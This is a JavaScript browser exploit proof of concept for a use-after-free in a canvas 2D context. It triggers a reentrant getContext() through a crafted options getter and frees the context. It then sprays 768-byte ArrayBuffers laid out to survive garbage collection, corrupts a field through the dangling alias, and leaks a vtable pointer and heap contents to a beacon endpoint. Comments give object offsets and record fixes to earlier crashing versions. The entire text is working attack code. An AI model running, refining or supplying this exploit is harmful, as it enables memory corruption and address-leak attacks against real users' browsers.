// p470 — Canvas UAF with GC-safe AB spray
//
// V461 confirmed: reentrant getContext() creates aliased context.
// V465/V467 crashed: GC visitAdditionalChildren reads m_canvas at +32 → SIGSEGV.
// FIX: Zero offset +32 in 768-byte spray ABs so GC sees null m_canvas.
//
// Context2D layout (~712 bytes → 768B FastMalloc size class):
//   +0:   vtable pointer
//   +32:  m_canvas (RefPtr<HTMLCanvasElement>) — MUST BE ZERO for GC safety
//   +112: m_stateStack.m_buffer (Vector pointer)
//   +592: m_unrealizedSaveCount (unsigned int) — safe: just ++, no deref
//
// Strategy:
//   1. Trigger reentrant getContext() → aliased inner context
//   2. Null the inner canvas to release context → context freed
//   3. Spray 768-byte ABs (zeroed at +32) to fill freed slot
//   4. Call save() on outer alias → increments m_unrealizedSaveCount at +592
//   5. Scan ABs for non-zero at offset 592 → identifies overlapping AB
//
// Beacon prefix: V470-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V470-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hx(b) { return (b < 16 ? '0' : '') + b.toString(16); }
  function hexN(view, off, n) {
    var s = '';
    for (var i = 0; i < n && off + i < view.length; i++) s += hx(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: Trigger reentrant getContext → aliased context
  // ═══════════════════════════════════════════════════════════
  var innerCtx = null;
  var outerCtx = null;
  var triggerCanvas = null;

  try {
    triggerCanvas = document.createElement('canvas');
    triggerCanvas.width = 100;
    triggerCanvas.height = 100;

    var callCount = 0;
    var evilDict = {};
    Object.defineProperty(evilDict, 'alpha', {
      get: function() {
        callCount++;
        if (callCount === 1) {
          // First call: inside outer getContext, grab inner context
          innerCtx = triggerCanvas.getContext('2d');
          B('INNER', innerCtx ? 'GOT' : 'NULL');
        }
        return true;
      }
    });

    outerCtx = triggerCanvas.getContext('2d', evilDict);
    B('OUTER', outerCtx ? 'GOT' : 'NULL');
    B('ALIAS', (innerCtx && outerCtx && innerCtx !== outerCtx) ? 'YES' : 'NO');
    B('CALLS', '' + callCount);

    if (!innerCtx || !outerCtx || innerCtx === outerCtx) {
      B('ABORT', 'no-alias');
      return;
    }
  } catch(e) {
    B('ERR-ALIAS', e.message);
    return;
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 2: Free the context by removing canvas reference
  // The inner context wrapper holds a ref. We need to break it.
  // Remove canvas from DOM, null references, GC pressure.
  // ═══════════════════════════════════════════════════════════
  try {
    // Drop the canvas element — context should be freed when GC runs
    // Keep outerCtx as our dangling handle
    innerCtx = null;
    triggerCanvas.width = 0;  // Forces context reset
    triggerCanvas.height = 0;
    triggerCanvas = null;

    // GC pressure to free the context
    for (var g = 0; g < 50; g++) {
      for (var j = 0; j < 200; j++) new ArrayBuffer(4096);
      for (var j = 0; j < 100; j++) new Array(50).fill(g);
    }
    B('GC-DONE');
  } catch(e) {
    B('ERR-FREE', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 3: Spray 768-byte ABs with zeroed m_canvas offset
  // Context2D = ~712 bytes → 768B size class in FastMalloc
  // ═══════════════════════════════════════════════════════════
  var AB_SIZE = 768;
  var N_SPRAY = 200;
  var MCANVAS_OFF = 32;    // m_canvas RefPtr offset — MUST stay zero
  var SAVE_OFF = 592;      // m_unrealizedSaveCount offset
  var MARKER = 0x41;       // 'A' fill for identification

  var sprayABs = [];
  var sprayViews = [];

  for (var i = 0; i < N_SPRAY; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var v = new Uint8Array(ab);
    // Fill with marker
    for (var j = 0; j < AB_SIZE; j++) v[j] = MARKER;
    // CRITICAL: zero offset 32-39 (m_canvas, 8 bytes) so GC doesn't crash
    for (var j = MCANVAS_OFF; j < MCANVAS_OFF + 8; j++) v[j] = 0;
    // Zero offset 592-595 (m_unrealizedSaveCount) so we can detect increment
    for (var j = SAVE_OFF; j < SAVE_OFF + 4; j++) v[j] = 0;
    sprayABs.push(ab);
    sprayViews.push(v);
  }
  B('SPRAY', N_SPRAY + 'x' + AB_SIZE);

  // More GC to encourage reclaim + reuse
  for (var g = 0; g < 20; g++) {
    for (var j = 0; j < 100; j++) new ArrayBuffer(2048);
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 4: Use save() via outerCtx (dangling alias)
  // save() does ++m_unrealizedSaveCount at +592 — no pointer deref
  // ═══════════════════════════════════════════════════════════
  try {
    B('SAVE-START');
    outerCtx.save();
    B('SAVE-1', 'OK');
    outerCtx.save();
    B('SAVE-2', 'OK');
    outerCtx.save();
    B('SAVE-3', 'OK');
  } catch(e) {
    B('SAVE-ERR', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 5: Scan ABs for save() marker at offset 592
  // 3 save() calls → m_unrealizedSaveCount should be 3
  // ═══════════════════════════════════════════════════════════
  B('SCAN-START');
  var hitIdx = -1;
  var hitVal = 0;

  for (var i = 0; i < sprayViews.length; i++) {
    var v = sprayViews[i];
    var val = u32(v, SAVE_OFF);
    if (val !== 0) {
      hitIdx = i;
      hitVal = val;
      B('HIT-' + i, 'saveCount=' + val);

      // Dump key offsets from the overlapping AB
      B('VTABLE-' + i, hexN(v, 0, 8));         // vtable at +0
      B('MCANVAS-' + i, hexN(v, 32, 8));       // m_canvas at +32
      B('STATESTACK-' + i, hexN(v, 112, 8));   // m_stateStack.m_buffer at +112
      B('SAVECOUNT-' + i, hexN(v, 592, 4));     // m_unrealizedSaveCount at +592

      // Dump wider region around save count
      B('REGION-' + i, hexN(v, 580, 32));

      // Dump first 64 bytes (vtable + early fields)
      B('HEAD-' + i, hexN(v, 0, 64));
    }
  }

  if (hitIdx >= 0) {
    B('SUMMARY', 'HIT-idx=' + hitIdx + ',saveCount=' + hitVal + ',total=' + N_SPRAY);

    // BONUS: Try reading vtable pointer for info leak
    var vt = hexN(sprayViews[hitIdx], 0, 8);
    B('VTABLE-LEAK', vt);

    // Try lineWidth read — if stateStack is intact, this reads from our AB data
    try {
      var lw = outerCtx.lineWidth;
      B('LINEWIDTH', '' + lw);
    } catch(e) {
      B('LINEWIDTH-ERR', e.message);
    }
  } else {
    B('NO-HIT', 'saveCount=0 in all ' + N_SPRAY + ' ABs');

    // Check if any AB was modified at all
    var anyDirty = 0;
    for (var i = 0; i < sprayViews.length; i++) {
      var v = sprayViews[i];
      for (var j = 0; j < AB_SIZE; j++) {
        if (j >= MCANVAS_OFF && j < MCANVAS_OFF + 8) continue; // skip zeroed region
        if (j >= SAVE_OFF && j < SAVE_OFF + 4) continue;
        if (v[j] !== MARKER) { anyDirty++; break; }
      }
    }
    B('DIRTY-ABS', '' + anyDirty);
  }

  B('DONE');
})();
